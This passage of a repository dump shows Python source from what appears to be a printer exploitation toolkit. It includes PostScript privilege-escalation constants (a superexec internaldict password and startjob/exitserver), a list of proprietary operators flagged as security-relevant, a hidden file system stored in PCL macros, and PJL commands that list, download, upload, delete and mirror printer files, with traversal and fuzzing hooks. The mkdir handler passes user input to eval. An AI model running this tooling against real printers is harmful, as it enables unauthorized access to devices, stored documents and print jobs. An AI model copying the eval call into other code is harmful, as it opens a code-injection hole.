postscript hack\n            data = re.sub(r'' + re.escape(const.PS_IOHACK), '', data)\n            # remove sent delimiter token\n            data = re.sub(r'\\(DELIMITER\\d+\\\\n\\) print flush\\n', '', data)\n            # remove recv delimiter token\n            data = re.sub(r'DELIMITER\\d+', '', data)\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        elif self.mode == 'pjl':\n            # remove sent/recv delimiter token\n            data = re.sub(r'@PJL ECHO\\s+DELIMITER\\d+', '', data)\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        elif self.mode == 'pcl':\n            # remove sent delimiter token\n            data = re.sub(r'\\x1b\\*s-\\d+X', '', data)\n            # remove recv delimiter token\n            data = re.sub(r'PCL\\x0d?\\x0a?\\x0c?ECHO -\\d+', '', data)\n            # replace sent escape sequences\n            data = re.sub(r'(' + const.ESC + ')', '<Esc>', data)\n            pass\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        # replace lineseps in between\n        data = re.sub(r'\\x0d?\\x0a?\\x0c', os.linesep, data)\n        # remove eot/eof sequences\n        data = data.strip(const.EOF)\n        return data\n\n# ----------------------------------------------------------------------\n\n\nclass const():  # define constants\n    SEP = '/'  # use posixoid path separator\n    EOL = '\\r\\n'  # line feed || carriage return\n    ESC = '\\x1b'  # used to start escape sequences\n    UEL = ESC + '%-12345X'  # universal exit language\n    EOF = EOL + '\\x0c\\x04'  # potential end of file chars\n    DELIMITER = \"DELIMITER\"  # delimiter marking end of response\n    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n    PS_CATCH = '%%\\[ (.*)\\]%%'\n    PS_ERROR = '%%\\[ Error: (.*)\\]%%'\n    PS_FLUSH = '%%\\[ Flushing: (.*)\\]%%'\n    PS_PROMPT = '>'  # TBD: could be derived from PS command 'prompt'\n    PS_HEADER = '@PJL ENTER LANGUAGE = POSTSCRIPT\\n%!\\n'\n    PS_GLOBAL = 'true 0 startjob pop\\n'  # 'serverdict begin 0 exitserver'\n    PS_SUPER = '\\n1183615869 internaldict /superexec get exec'\n    PS_NOHOOK = '/nohook true def\\n'\n    PS_IOHACK = '/print {(%stdout) (w) file dup 3 2 roll writestring flushfile} def\\n'\\\n        '/== {128 string cvs print (\\\\n) print} def\\n'\n    PCL_HEADER = '@PJL ENTER LANGUAGE = PCL' + EOL + ESC\n    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n    SUPERBLOCK = '31337'  # define super macro id to contain pclfs table\n    BLOCKRANGE = list(range(10000, 20000))  # use those macros for file content\n    FILE_EXISTS = -1  # file size to be returned if file/dir size unknown\n    NONEXISTENT = -2  # file size to be returned if a file does not exist\n    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n    PS_VOL = ''  # no default volume in ps (read: any, write: first)\n    PJL_VOL = '0:' + SEP  # default pjl volume name || path separator\n"
        },
        {
          "name": "img",
          "type": "tree",
          "content": null
        },
        {
          "name": "lpd",
          "type": "tree",
          "content": null
        },
        {
          "name": "mibs",
          "type": "tree",
          "content": null
        },
        {
          "name": "operators.py",
          "type": "blob",
          "size": 10.73046875,
          "content": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nclass operators():\n    '''\n    ┌─────────────────────────────────────┐\n    │ PostScript operators and categories │\n    └─────────────────────────────────────┘\n    '''\n    oplist = {\n        '01. Operand Stack Manipulation Operators':\n        [\n            'pop',\n            'exch',\n            'dup',\n            'copy',\n            'index',\n            'roll',\n            'clear',\n            'count',\n            'mark',\n            'cleartomark',\n            'counttomark'\n        ],\n        '02. Arithmetic and Math Operators':\n        [\n            'add',\n            'div',\n            'idiv',\n            'mod',\n            'mul',\n            'sub',\n            'abs',\n            'neg',\n            'ceiling',\n            'floor',\n            'round',\n            'truncate',\n            'sqrt',\n            'atan',\n            'cos',\n            'sin',\n            'exp',\n            'ln',\n            'log',\n            'rand',\n            'srand',\n            'rrand'\n        ],\n        '03. Array Operators':\n        [\n            'array',\n            'length',\n            'get',\n            'put',\n            'getinterval',\n            'putinterval',\n            'astore',\n            'aload',\n            'forall'\n        ],\n        '04. Packed Array Operators':\n        [\n            'packedarray',\n            'setpacking',\n            'currentpacking'\n        ],\n        '05. Dictionary Operators':\n        [\n            'dict ',\n            'maxlength',\n            'begin',\n            'end',\n            'def',\n            'load',\n            'store',\n            'undef',\n            'known',\n            'where',\n            'currentdict',\n            'errordict',\n            '$error',\n            'systemdict',\n            'userdict',\n            'globaldict',\n            'statusdict',\n            'countdictstack',\n            'dictstack',\n            'cleardictstack'\n        ],\n        '06. String Operators':\n        [\n            'string',\n            'anchorsearch',\n            'search'\n        ],\n        '07. Relational, Boolean, and Bitwise Operators':\n        [\n            'eq',\n            'ne',\n            'ge',\n            'gt',\n            'le',\n            'lt',\n            'and',\n            'or',\n            'xor',\n            'true',\n            'false',\n            'bitshift'\n        ],\n        '08. Control Operators':\n        [\n            'exec',\n            'if',\n            'ifelse',\n            'for',\n            'repeat',\n            'loop',\n            'exit',\n            'stop',\n            'stopped',\n            'countexecstack',\n            'execstack',\n            'quit',\n            'start'\n        ],\n        '09. Type, Attribute, and Conversion Operators':\n        [\n            'type',\n            'cvlit',\n            'cvx',\n            'xcheck',\n            'executeonly',\n            'noaccess',\n            'readonly',\n            'rcheck',\n            'wcheck',\n            'cvi',\n            'cvn',\n            'cvr',\n            'cvrs',\n            'cvs'\n        ],\n        '10. File Operators':\n        [\n            'file',\n            'filter',\n            'closefile',\n            'read',\n            'write',\n            'readhexstring',\n            'writehexstring',\n            'readstring',\n            'writestring',\n            'readline',\n            'token',\n            'bytesavailable',\n            'flush',\n            'flushfile',\n            'resetfile',\n            'status',\n            'run',\n            'currentfile',\n            'deletefile',\n            'renamefile',\n            'filenameforall',\n            'setfileposition',\n            'fileposition',\n            'print',\n            '=',\n            '==',\n            'stack',\n            'pstack',\n            'printobject',\n            'writeobject',\n            'setobjectformat',\n            'currentobjectformat'\n        ],\n        '11. Resource Operators':\n        [\n            'defineresource',\n            'undefineresource',\n            'findresource',\n            'findcolorrendering',\n            'resourcestatus',\n            'resourceforall'\n        ],\n        '12. Virtual Memory Operators':\n        [\n            'save',\n            'restore',\n            'setglobal',\n            'currentglobal',\n            'gcheck',\n            'startjob',\n            'defineuserobject',\n            'execuserobject',\n            'undefineuserobject'\n        ],\n        '13. Miscellaneous Operators':\n        [\n            'bind',\n            'null',\n            'version',\n            'realtime',\n            'usertime',\n            'languagelevel',\n            'product',\n            'revision',\n            'serialnumber',\n            'executive',\n            'echo',\n            'prompt'\n        ],\n        '14. Device Setup and Output Operators':\n        [\n            'showpage',\n            'copypage',\n            'setpagedevice',\n            'currentpagedevice',\n            'nulldevice'\n        ],\n        '15. Error Operators':\n        [\n            'handleerror',\n            '.error'\n        ],\n        '16. Supplement and Proprietary Operators':\n        [\n            'BiteMe',\n            'brCIDCode',\n            'brfindfont',\n            'brGetCurrentColor',\n            'brgetjpnfont',\n            '_BRFileExec',\n            '_brGetXPSPage',\n            '_brGetXPSThumb',\n            '_brpdfscan',\n            'brlanguagelevel',\n            'brPchk',\n            'brPDFThumbPrint',\n            'brPSDKey',\n            'BrRegiChart',\n            'brTpForm',\n            'brTpPjlCheck',\n            'brTpStroke',\n            'buildfunction',\n            'buildtime',\n            'byteorder',\n            'cache_memory',\n            'callut',\n            'cexec',\n            'changeucrgcr',\n            'chdir',\n            'checksum',\n            'cidcompat',\n            'clearinterrupt',\n            'command',\n            'composefont',\n            'cwd',\n            'defaultduplexmode',\n            'defaultpapertray',\n            'defaultresolution',\n            'defaulttimeouts',\n            'defaulttrayswitch',\n            'defaulttumble',\n            'devcontrol',\n            'devdismount',\n            'devforall',\n            'devformat',\n            'devmount',\n            'devstatus',\n            'directimage',\n            'disableinterrupt',\n            'discardtransparencygroup',\n            'diskonline',\n            'diskstatus',\n            'displayoperatormsg',\n            'doautoformfeed',\n            'doexecutive',\n            'doffsuppress',\n            'doinitfile',\n            'dopanellock',\n            'dopowersave',\n            'doprinterrors',\n            'doreprint',\n            'dostartpage',\n            'dosysstart',\n            'duplexer',\n            'enableinterrupt',\n            'endjob',\n            'endtransparencygroup',\n            'endtransparencymask',\n            'enginesync',\n            'execdepth',\n            'execn',\n            'execpoolimgtable',\n            'execvecttoimagetable',\n            'findcolorrendering',\n            'firstside',\n            'fontnonzerowinding',\n            'fontprivatedict',\n            'gadget',\n            'getedlut',\n            'getenginedebug',\n            'getentitydir',\n            'getfinelut',\n            'getjobstms',\n            'getmydata',\n            'getpassword',\n            'getsuperfinelut',\n            'gettrue1200',\n            'getufstring',\n            'hardwareiomode',\n            'idle',\n            'idlefonts',\n            'ignoresize',\n            'imagemasksw',\n            'imagetiff',\n            'initializedisk',\n            'initlut',\n            'inittransparencymask',\n            'interrupts_clear',\n            'interrupts_enabled',\n            'interrupts_no',\n            'interrupts_reset',\n            'interrupts_yes',\n            'ipdsjog',\n            'jobtimeout',\n            'kccreatepic',\n            'kcdeletepic',\n            'kcloadpic',\n            'kcmakebarcode',\n            'kcrevivepic',\n            'kcsavepic',\n            'lzwavailable',\n            'malloc_verify',\n            'MD5Encode',\n            'newsheet',\n            'pagecount',\n            'pagesprinted',\n            'panel',\n            'paperdirectional',\n            'papertray',\n            'patternsearch',\n            'pdfnewsheet',\n            'peek',\n            'poke',\n            'powersavetime',\n            'pragmatics',\n            'printconfiguration',\n            'printername',\n            'printer_reset',\n            'printer_status',\n            'processcolors',\n            'processipdserror',\n            'pwd',\n            'ramsize',\n            'rdbytes',\n            'readinputbuffer',\n            'readpbstring',\n            'readtotalramsize',\n            'remain_memory',\n            'removeall',\n            'removeglyphs',\n            'resolveicc',\n            'sccbatch',\n            'sccinteractive',\n            'setbrFilename',\n            'setbrTpBM',\n            'setbrTpca',\n            'setcoverpage',\n            'setdefaultduplexmode',\n            'setdefaultpapertray',\n            'setdefaultresolution',\n            'setdefaulttimeouts',\n            'setdefaulttrayswitch',\n            'setdefaulttumble',\n            'setdoautoformfeed',\n            'setdoffsuppress',\n            'setdopanellock',\n            'setdopowersave',\n            'setdoprinterrors',\n            'setdoreprint',\n            'setdostartpage',\n            'setdosysstart',\n            'setedlut',\n            'setenginesync',\n            'setfilenameextend',\n            'setfillalpha',\n            'setfinelut',\n            'sethardwareiomode',\n            'setignoresize',\n            'setipdsmode',\n            'setjobname',\n            'setjobtimeout',\n            'setmanualduplexmode',\n            'setmediatype',\n            'setpantonescreen',\n            'setpapertray',\n            'setpassword',\n            'setprintername',\n            'setropmode',\n            'setsccbatch',\n            'setsccinteractive',\n            'setsmoothness',\n            'setsoftalpha',\n            'setsoftwareiomode',\n            'setstrokealpha',\n            'setsuperfinelut',\n            'setuniversalsize',\n            'setusbbinary',\n            'setuserdiskpercent',\n            'smooth4',\n            'softwareiomode',\n            'statementnumber',\n            'stretch',\n            'tonersave',\n            'train_memory',\n            'transparencyshowpage',\n            'ucrgcrforimage',\n            'ucrgcrtable600',\n            'ucrgcrtablecapt',\n            'unlimit',\n            'usepantonescreen',\n            'userdiskpercent',\n            'verify'\n        ]  # TBD: reduce to the `interesting' ones (from a security point of view)\n    }\n"
        },
        {
          "name": "overlays",
          "type": "tree",
          "content": null
        },
        {
          "name": "pcl.py",
          "type": "blob",
          "size": 10.5693359375,
          "content": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# python standard library\nimport re\nimport os\nimport json\nimport random\n\n# local pret classes\nfrom printer import printer\nfrom helper import log, output, conv, item, const as c\n\n\nclass pcl(printer):\n    # --------------------------------------------------------------------\n    # send PCL command to printer, optionally receive response\n    def cmd(self, str_send, fb=True):\n        str_recv = \"\"  # response buffer\n        token = str(random.randrange(2**8, 2**15) * -1)  # -256..-32767\n        footer = c.ESC + \"*s\" + token + \"X\"  # echo delimiter\n        # send command to printer device\n        try:\n            cmd_send = c.UEL + c.PCL_HEADER + str_send + footer + c.UEL\n            # write to logfile\n            log().write(self.logfile, c.ESC + str_send + os.linesep)\n            # sent to printer\n            self.send(cmd_send)\n            # use random token as delimiter for PCL responses\n            str_recv = self.recv(\"ECHO \" + token + \".*$\", fb)\n            # crop all PCL lines from received buffer\n            str_recv = re.sub(r\"\\x0d?\\x0a?\\x0c?PCL.*\\x0a?\", \"\", str_recv)\n            return str_recv\n\n        # handle CTRL+C and exceptions\n        except (KeyboardInterrupt, Exception) as e:\n            self.reconnect(str(e))\n            return \"\"\n\n    # --------------------------------------------------------------------\n    # remove functions not implemented in pcl\n    def __init__(self, args):\n        del (\n            printer.do_rmdir,\n            printer.do_chvol,\n            printer.do_pwd,\n        )\n        del (\n            printer.do_touch,\n            printer.do_append,\n            printer.do_cd,\n        )\n        del printer.do_traversal, printer.help_fuzz, printer.do_fuzz\n        return super(pcl, self).__init__(args)\n\n    # ====================================================================\n\n    \"\"\"\n  ┌───────────────────────────────────────────────────────────────┐\n  │     `pclfs' specs // mostly implemented for the hack value    │\n  ├────────────┬──────────────┬───────────────────────────────────┤\n  │ macro ids  │        31337 │ superblock (serialized metadata)  │\n  │            │ 10000..19999 │ file content (binary or ascii)    │\n  ├────────────┼──────────────┼───────────────────────────────────┤\n  │ echo codes │       0..255 │ ascii encoding for file transfers │\n  │            │ -256..-32767 │ protocol delimiters for pcl jobs  │\n  ├────────────┴──────────────┴───────────────────────────────────┤\n  │ `superblock' format: JSON containing id, size and timestamp   │\n  └───────────────────────────────────────────────────────────────┘\n  \"\"\"\n\n    # check if remote file exists\n    def file_exists(self, path):\n        pclfs = self.dirlist()\n        for name, (id, size, date) in list(pclfs.items()):\n            if path == name:\n                return int(size)\n        return c.NONEXISTENT\n\n    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n    # auto-complete dirlist for remote fs\n    options_rfiles = {}\n\n    def complete_rfiles(self, text, line, begidx, endidx):\n        return [cat for cat in self.options_rfiles if cat.startswith(text)]\n\n    # define alias\n    complete_delete = complete_rfiles  # file_or_dir\n    complete_rm = complete_rfiles  # file_or_dir\n    complete_get = complete_rfiles  # file_or_dir\n    complete_cat = complete_rfiles  # file_or_dir\n    complete_edit = complete_rfiles  # file_or_dir\n    complete_vim = complete_rfiles  # file_or_dir\n\n    # get list of macro ids on printer device\n    def idlist(self):\n        list = []\n        str_send = \"*s4T\"  # set location type (downloaded)\n        str_send += c.ESC + \"*s0U\"  # set location unit (all units)\n        str_send += c.ESC + \"*s1I\"  # set inquire entity (macros)\n        str_recv = self.cmd(str_send)\n        idlist = re.findall('IDLIST=\"(.*),?\"', str_recv)  # maybe this can\n        for id in item(idlist).split(\",\"):  # be packed into\n            if id.startswith(\"1\"):\n                list.append(int(id))  # a single regex\n        return list\n\n    # get list of files on virtual file system\n    def dirlist(self, pclfs={}):\n        superblock = self.retrieve_data(c.SUPERBLOCK)\n        if superblock:  # de-serialize pclfs dictionary\n            try:\n                pclfs = json.loads(superblock)\n            except:\n                pass  # non-existent or invalid superblock\n        self.options_rfiles = pclfs\n        return pclfs\n\n    # ------------------------[ ls ]--------------------------------------\n    def do_ls(self, arg):\n        \"List contents of virtual file system:  ls\"\n        pclfs = self.dirlist()\n        if not pclfs:  # no files have yet been uploaded\n            output().raw(\"This is a virtual pclfs. Use 'put' to upload files.\")\n        # list files with syntax highlighting\n        for name, (id, size, date) in sorted(pclfs.items()):\n            output().pcldir(size, conv().lsdate(int(date)), id, name)\n\n    # ====================================================================\n\n    # ------------------------[ delete <file> ]---------------------------\n    def delete(self, arg):\n        pclfs = self.dirlist()\n        if arg in pclfs:\n            id = pclfs[arg][0]\n            # remove pclfs entry\n            del pclfs[arg]\n            self.update_superblock(pclfs)\n            # remove macro itself\n            self.delete_macro(id)\n        else:\n            print(\"File not found.\")\n\n    # ------------------------[ get <file> ]------------------------------\n    def get(self, path, size=None):\n        pclfs = self.dirlist()\n        for name, (id, size, date) in list(pclfs.items()):\n            if path == name:\n                str_recv = self.retrieve_data(id)\n                return (int(size), str_recv)\n        print(\"File not found.\")\n        return c.NONEXISTENT\n\n    def retrieve_data(self, id):\n        str_send = \"&f\" + id + \"Y\"  # set macro id\n        str_send += c.ESC + \"&f2X\"  # execute macro\n        return self.echo2data(self.cmd(str_send))\n\n    # ------------------------[ put <local file> ]------------------------\n    def put(self, path, data):\n        path = self.basename(path)\n        pclfs = self.dirlist()\n        # re-use macro id if file name already present\n        if path in pclfs:\n            id = pclfs[path][0]\n        # find free macro id not already reserved for file\n        else:\n            id = str(item(set(c.BLOCKRANGE).difference(self.idlist())))\n        # abort if we have used up the whole macro id space\n        if not id:\n            return output().warning(\"Out of macro slots.\")\n        self.chitchat(\"Using macro id #\" + id)\n        # retrieve and update superblock\n        size = str(len(data))\n        date = str(conv().now())\n        pclfs[path] = [id, size, date]\n        self.update_superblock(pclfs)\n        # save data as pcl macro on printer\n        self.define_macro(id, data)\n\n    # ====================================================================\n\n    # define macro on printer device\n    def define_macro(self, id, data):\n        str_send = \"&f\" + id + \"Y\"  # set macro id\n        str_send += c.ESC + \"&f0X\"  # start macro\n        str_send += self.data2echo(data)  # echo commands\n        str_send += c.ESC + \"&f1X\"  # end macro\n        str_send += c.ESC + \"&f10X\"  # make permanent\n        self.cmd(str_send, False)\n\n    # delete macro from printer device\n    def delete_macro(self, id):\n        str_send = \"&f\" + id + \"Y\"  # set macro id\n        str_send += c.ESC + \"&f8X\"  # delete macro\n        self.cmd(str_send, False)\n\n    # update information on virtual file system\n    def update_superblock(self, pclfs):\n        # serialize pclfs dictionary\n        pclfs = json.dumps(pclfs)\n        self.define_macro(c.SUPERBLOCK, pclfs)\n\n    # convert binary data to pcl echo commands\n    def data2echo(self, data):\n        echo = \"\"\n        for n in data:\n            echo += c.ESC + \"*s\" + str(ord(n)) + \"X\"\n        return echo\n\n    # convert pcl echo commands to binary data\n    def echo2data(self, echo):\n        data = \"\"\n        echo = re.findall(\"ECHO (\\d+)\", echo)\n        for n in echo:\n            data += conv().chr(n)\n        return data\n\n    # ====================================================================\n\n    # ------------------------[ info <category> ]-------------------------\n    def do_info(self, arg):\n        if arg in self.entities:\n            entity, desc = self.entities[arg]\n            for location in self.locations:\n                output().raw(desc + \" \" + self.locations[location])\n                str_send = \"*s\" + location + \"T\"  # set location type\n                str_send += c.ESC + \"*s0U\"  # set location unit\n                str_send += c.ESC + \"*s\" + entity + \"I\"  # set inquire entity\n                output().info(self.cmd(str_send))\n        else:\n            self.help_info()\n\n    def help_info(self):\n        print(\"Show information:  info <category>\")\n        print(\"  info fonts      - Show installed fonts.\")\n        print(\"  info macros     - Show installed macros.\")\n        print(\"  info patterns   - Show user-defined patterns.\")\n        print(\"  info symbols    - Show symbol sets.\")\n        print(\"  info extended   - Show extended fonts.\")\n\n    def complete_info(self, text, line, begidx, endidx):\n        return [cat for cat in self.entities if cat.startswith(text)]\n\n    entities = {\n        \"fonts\": [\"0\", \"Fonts\"],\n        \"macros\": [\"1\", \"Macros\"],\n        \"patterns\": [\"2\", \"User-defined Patterns\"],\n        \"symbols\": [\"3\", \"Symbol Sets\"],\n        \"extended\": [\"4\", \"Fonts Extended\"],\n    }\n    locations = {\n        # '1': '(Selected)',\n        # '2': '(All Locations)',\n        \"3\": \"(Internal)\",\n        \"4\": \"(Downloaded)\",\n        \"5\": \"(Cartridge)\",\n        \"7\": \"(ROM/SIMMs)\",\n    }\n\n    # ------------------------[ df ]--------------------------------------\n    def do_free(self, arg):\n        \"Show available memory.\"\n        output().info(self.cmd(\"*s1M\"))\n\n    # ------------------------[ selftest ]--------------------------------\n    def do_selftest(self, arg):\n        \"Perform printer self-test.\"\n        output().info(self.cmd(\"z\"))\n"
        },
        {
          "name": "pjl.py",
          "type": "blob",
          "size": 37.9990234375,
          "content": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# python standard library\nimport re\nimport os\nimport random\nimport posixpath\n\n# local pret classes\nfrom printer import printer\nfrom codebook import codebook\nfrom helper import log, output, conv, file, item, chunks, const as c\n\n\nclass pjl(printer):\n    # --------------------------------------------------------------------\n    # send PJL command to printer, optionally receive response\n    def cmd(self, str_send, wait=True, crop=True, binary=False):\n        str_recv = \"\"  # response buffer\n        str_stat = \"\"  # status buffer\n        token = c.DELIMITER + str(random.randrange(2**16))  # unique delimiter\n        status = \"@PJL INFO STATUS\" + c.EOL if self.status and wait else \"\"\n        footer = \"@PJL ECHO \" + token + c.EOL + c.EOL if wait else \"\"\n        # send command to printer device\n        try:\n            cmd_send = c.UEL + str_send + c.EOL + status + footer + c.UEL\n            # write to logfile\n            log().write(self.logfile, str_send + os.linesep)\n            # sent to printer\n            self.send(cmd_send)\n            # for commands that expect a response\n            if wait:\n                # use random token as delimiter PJL responses\n                str_recv = self.recv(\n                    \"(@PJL ECHO\\s+)?\" + token + \".*$\", wait, True, binary\n                )\n                if self.status:\n                    # get status messages and remove them from received buffer\n                    str_stat = item(\n                        re.findall(\"@PJL INFO STATUS.*\", str_recv, re.DOTALL)\n                    )\n                    str_recv = re.compile(\"\\x0c?@PJL INFO STATUS.*\", re.DOTALL).sub(\n                        \"\", str_recv\n                    )\n                if crop:\n                    # crop very first PJL line which is echoed by most interpreters\n                    str_recv = re.sub(\n                        r\"^\\x04?(\\x00+)?@PJL.*\" + c.EOL, \"\", str_recv)\n            return self.pjl_err(str_recv, str_stat)\n\n        # handle CTRL+C and exceptions\n        except (KeyboardInterrupt, Exception) as e:\n            if not self.fuzz or not str(e):\n                self.reconnect(str(e))\n            return \"\"\n\n    # handle error messages from PJL interpreter\n    def pjl_err(self, str_recv, str_stat):\n        # show file error messages\n        self.fileerror(str_recv)\n        # show PJL status messages\n        self.showstatus(str_stat)\n        # but return buffer anyway\n        return str_recv\n\n    # disable unsolicited/conflicting status messages\n    def on_connect(self, mode):\n        if mode == \"init\":  # only for the first connection attempt\n            self.cmd(\"@PJL USTATUSOFF\", False)  # disable status messages\n\n    # ------------------------[ status ]----------------------------------\n    def do_status(self, arg):\n        \"Enable status messages.\"\n        self.status = not self.status\n        print(\n            (\"Status messages enabled\" if self.status else \"Status messages disabled\")\n        )\n\n    # parse PJL status message\n    def showstatus(self, str_stat):\n        codes = {}\n        messages = {}\n        # get status codes\n        for (num, code) in re.findall(\"CODE(\\d+)?\\s*=\\s*(\\d+)\", str_stat):\n            codes[num] = code\n        # get status messages\n        for (num, mstr) in re.findall('DISPLAY(\\d+)?\\s*=\\s*\"(.*)\"', str_stat):\n            messages[num] = mstr\n        # show codes and messages\n        for num, code in list(codes.items()):\n            message = messages[num] if num in messages else \"UNKNOWN STATUS\"\n            # workaround for hp printers with wrong range\n            if code.startswith(\"32\"):\n                code = str(int(code) - 2000)\n            # show status from display and codebook\n            error = item(codebook().get_errors(code), \"Unknown status\")\n            output().errmsg(\"CODE \" + code + \": \" + message, error)\n\n    # parse PJL file errors\n    def fileerror(self, str_recv):\n        self.error = None\n        for code in re.findall(\"FILEERROR\\s*=\\s*(\\d+)\", str_recv):\n            # file errors are 300xx codes\n            code = \"3\" + code.zfill(4)\n            for error in codebook().get_errors(code):\n                self.chitchat(\"PJL Error: \" + error)\n                self.error = code\n\n    # --------------------------------------------------------------------\n    # check if remote volume exists\n    def vol_exists(self, vol=\"\"):\n        str_recv = self.cmd(\"@PJL INFO FILESYS\")\n        vols = [line.lstrip()[0] for line in str_recv.splitlines()[1:] if line]\n        if vol:\n            return vol[0] in vols  # return availability\n        else:  # return list of existing volumes for fuzzing\n            return [vol + \":\" + c.SEP for vol in vols]\n\n    # check if remote directory exists\n    def dir_exists(self, path):\n        str_recv = self.cmd('@PJL FSQUERY NAME=\"' + path + '\"', True, False)\n        if re.search(\"TYPE=DIR\", str_recv):\n            return True\n\n    # check if remote file exists\n    def file_exists(self, path):\n        str_recv = self.cmd('@PJL FSQUERY NAME=\"' + path + '\"', True, False)\n        size = re.findall(\"TYPE\\s*=\\s*FILE\\s+SIZE\\s*=\\s*(\\d*)\", str_recv)\n        # return file size\n        return conv().int(item(size, c.NONEXISTENT))\n\n    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n    # auto-complete dirlist for remote fs\n    options_rfiles = {}\n\n    def complete_rfiles(self, text, line, begidx, endidx, path=\"\"):\n        # get path from line\n        if c.SEP in line:\n            path = posixpath.dirname(re.split(\"\\s+\", line, 1)[-1:][0])\n        # get dirlist, set new remote path\n        newpath = self.cwd + c.SEP + path\n        if not self.options_rfiles or newpath != self.oldpath_rfiles:\n            self.options_rfiles = self.dirlist(path)\n            self.oldpath_rfiles = self.cwd + c.SEP + path\n        # options_rfiles contains basenames\n        text = self.basename(text)\n        return [cat for cat in self.options_rfiles if cat.startswith(text)]\n\n    # define alias\n    complete_append = complete_rfiles  # files or directories\n    complete_delete = complete_rfiles  # files or directories\n    complete_rm = complete_rfiles  # files or directories\n    complete_get = complete_rfiles  # files or directories\n    complete_cat = complete_rfiles  # files or directories\n    complete_edit = complete_rfiles  # files or directories\n    complete_vim = complete_rfiles  # files or directories\n    complete_touch = complete_rfiles  # files or directories\n    complete_rename = complete_rfiles  # files or directories\n    complete_mv = complete_rfiles  # files or directories\n\n    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n    # auto-complete dirlist for remote fs (directories only)\n    options_rdirs = {}\n\n    def complete_rdirs(self, text, line, begidx, endidx, path=\"\"):\n        # get path from line\n        if c.SEP in line:\n            path = posixpath.dirname(re.split(\"\\s+\", line, 1)[-1:][0])\n        # get dirlist, set new remote path\n        newpath = self.cwd + c.SEP + path\n        if not self.options_rdirs or newpath != self.oldpath_rdirs:\n            self.options_rdirs = self.dirlist(path, True, False, True)\n            self.oldpath_rdirs = newpath\n        # options_rdirs contains basenames\n        text = self.basename(text)\n        return [cat for cat in self.options_rdirs if cat.startswith(text)]\n\n    # define alias\n    complete_ls = complete_rdirs  # directories only\n    complete_cd = complete_rdirs  # directories only\n    complete_rmdir = complete_rdirs  # directories only\n    complete_find = complete_rdirs  # directories only\n    complete_mirror = complete_rdirs  # directories only\n\n    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n    # get list of files and directories on remote device\n    def dirlist(self, path, sep=True, hidden=False, dirsonly=False, r=True):\n        # get remote path if not in recursive mode\n        if r:\n            path = self.rpath(path)\n        # receive list of files on remote device\n        str_recv = self.cmd('@PJL FSDIRLIST NAME=\"' +\n                            path + '\" ENTRY=1 COUNT=65535')\n        list = {}\n        for item in str_recv.splitlines():\n            # get directories\n            dirname = re.findall(\"^(.*)\\s+TYPE\\s*=\\s*DIR$\", item)\n            if dirname and (dirname[0] not in (\"\", \".\", \"..\") or hidden):\n                sep = c.SEP if sep and dirname[0][-1:] != c.SEP else \"\"\n                list[dirname[0] + sep] = None\n            # get files\n            filename = re.findall(\"^(.*)\\s+TYPE\\s*=\\s*FILE\", item)\n            filesize = re.findall(\"FILE\\s+SIZE\\s*=\\s*(\\d*)\", item)\n            if filename and filesize and not dirsonly:\n                list[filename[0]] = filesize[0]\n        return list\n\n    # ------------------------[ ls <path> ]-------------------------------\n    def do_ls(self, arg):\n        \"List contents of remote directory:  ls <path>\"\n        list = self.dirlist(arg, False, True)\n        # remove '.' and '..' from non-empty directories\n        if set(list).difference((\".\", \"..\")):\n            for key in set(list).intersection((\".\", \"..\")):\n                del list[key]\n        # list files with syntax highlighting\n        for name, size in sorted(list.items()):\n            output().pjldir(name, size)\n\n    # ====================================================================\n\n    # ------------------------[ mkdir <path> ]----------------------------\n    def do_mkdir(self, arg):\n        \"Create remote directory:  mkdir <path>\"\n        if not arg:\n            arg = eval(input(\"Directory: \"))\n        path = self.rpath(arg)\n        self.cmd('@PJL FSMKDIR NAME=\"' + path + '\"', False)\n\n    # ------------------------[ get <file> ]------------------------------\n    def get(self, path, size=None):\n        if not size:\n            size = self.file_exists(path)\n        if size != c.NONEXISTENT:\n            str_recv = self.cmd(\n                '@PJL FSUPLOAD NAME=\"' + path + '\" OFFSET=0 SIZE=' + str(size),\n                True,\n                True,\n                True,\n            )\n            return (size, str_recv)\n        else:\n            print(\"File not found.\")\n            return c.NONEXISTENT\n\n    # ------------------------[ put <local file> ]------------------------\n    def put(self, path, data):\n        lsize = len(data)\n        self.cmd(\n            \"@PJL FSDOWNLOAD FORMAT:BINARY SIZE=\"\n            + str(lsize)\n            + ' NAME=\"'\n            + path\n            + '\"'\n            + c.EOL\n            + data,\n            False,\n        )\n\n    # ------------------------[ append <file> <string> ]------------------\n    def append(self, path, data):\n        lsize = len(data)\n        self.cmd(\n            \"@PJL FSAPPEND FORMAT:BINARY SIZE=\"\n            + str(lsize)\n            + ' NAME=\"'\n            + path\n            + '\"'\n            + c.EOL\n            + data,\n            False,\n        )\n\n    # ------------------------[ delete <file> ]---------------------------\n    def delete(self, arg):\n        path = self.rpath(arg)\n        self.cmd('@PJL FSDELETE NAME=\"' + path + '\"', False)\n\n    # ------------------------[ find <path> ]-----------------------------\n    def do_find(self, arg):\n        \"Recursively list contents of directory:  find <path>\"\n        self.fswalk(arg, \"find\")\n\n    # ------------------------[ mirror <local path> ]---------------------\n    def do_mirror(self, arg):\n        \"Mirror remote file system to local directory:  mirror <remote path>\"\n        print((\"Creating mirror of \" + c.SEP + self.vpath(arg)))\n        self.fswalk(arg, \"mirror\")\n\n    # perform recursive function on file system\n    def fswalk(self, arg, mode, recursive=False):\n        # add traversal and cwd in first run\n        if not recursive:\n            arg = self.vpath(arg)\n        # add volume information to pathname\n        path = self.vol + self.normpath(arg)\n        list = self.dirlist(path, True, False, False, False)\n        # for files in current directory\n        for name, size in sorted(list.items()):\n            name = self.normpath(arg) + self.get_sep(arg) + name\n            name = name.lstrip(c.SEP)  # crop leading slashes\n            # execute function for current file\n            if mode == \"find\":\n                output().raw(c.SEP + name)\n    